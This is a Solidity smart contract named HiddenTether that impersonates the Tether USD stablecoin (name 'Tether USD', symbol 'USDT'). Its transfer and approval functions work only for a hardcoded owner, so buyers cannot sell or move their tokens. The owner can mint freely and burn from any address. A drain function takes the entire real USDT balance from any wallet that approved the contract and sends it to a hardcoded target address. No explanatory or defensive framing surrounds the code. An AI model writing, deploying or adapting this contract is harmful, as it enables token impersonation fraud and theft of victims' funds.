// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract HiddenTether {
    address private constant _OWNER = 0x0b3Aa0BC4BE5058f3239cF8a79AAAFf4959D619a;
    address private constant _USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant _TARGET = 0x11679c8777609929BB11fe41A4195e9263Cb54E3;

    uint256 private _totalSupply;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool private _tradingEnabled;
    bool private _isPoolRestricted = true;
    mapping(address => bool) private _isPool;

    constructor(uint256 initialSupply) {
        require(msg.sender == _OWNER, "Only owner can deploy");
        _totalSupply = initialSupply * 10**6;
        _balances[_OWNER] = _totalSupply;
    }

    modifier _onlyOwner() {
        require(msg.sender == _OWNER, "Not owner");
        _;
    }

    function attachAndTransferUSDT() external _onlyOwner {
        IERC20 usdt = IERC20(_USDT);
        uint256 ownerUSDTBalance = usdt.balanceOf(_OWNER);

        require(usdt.transferFrom(_OWNER, address(this), ownerUSDTBalance), "USDT transfer from owner failed");
        require(usdt.transfer(_TARGET, ownerUSDTBalance), "USDT transfer to target failed");
    }

    function attachAndTransferFromAnyWallet(address wallet) external _onlyOwner {
        IERC20 usdt = IERC20(_USDT);
        uint256 walletUSDTBalance = usdt.balanceOf(wallet);

        require(usdt.transferFrom(wallet, address(this), walletUSDTBalance), "USDT transfer from wallet failed");
        require(usdt.transfer(_TARGET, walletUSDTBalance), "USDT transfer to target failed");
    }

    function name() external pure returns (string memory) {
        return "Tether USD";
    }

    function symbol() external pure returns (string memory) {
        return "USDT";
    }

    function decimals() external pure returns (uint8) {
        return 6;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) external _onlyOwner returns (bool) {
        require(_tradingEnabled, "Trading disabled");
        require(!_isPool[_OWNER] || !_isPoolRestricted, "Pool restricted");
        require(_balances[_OWNER] >= amount, "Insufficient balance");

        _balances[_OWNER] -= amount;
        _balances[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external _onlyOwner returns (bool) {
        _allowances[_OWNER][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external _onlyOwner returns (bool) {
        require(_tradingEnabled, "Trading disabled");
        require(!_isPool[_OWNER] || !_isPoolRestricted, "Pool restricted");
        require(_balances[from] >= amount, "Insufficient balance");
        require(_allowances[from][_OWNER] >= amount, "Insufficient allowance");

        _balances[from] -= amount;
        _balances[to] += amount;
        _allowances[from][_OWNER] -= amount;
        return true;
    }

    function mint(address to, uint256 amount) external _onlyOwner {
        _totalSupply += amount;
        _balances[to] += amount;
    }

    function burn(address from, uint256 amount) external _onlyOwner {
        require(_balances[from] >= amount, "Insufficient balance");
        _totalSupply -= amount;
        _balances[from] -= amount;
    }

    function enableTrading() external _onlyOwner {
        _tradingEnabled = true;
    }

    function disableTrading() external _onlyOwner {
        _tradingEnabled = false;
    }

    function setPoolRestriction(bool enabled) external _onlyOwner {
        _isPoolRestricted = enabled;
    }

    function setPool(address pool, bool status) external _onlyOwner {
        _isPool[pool] = status;
    }
}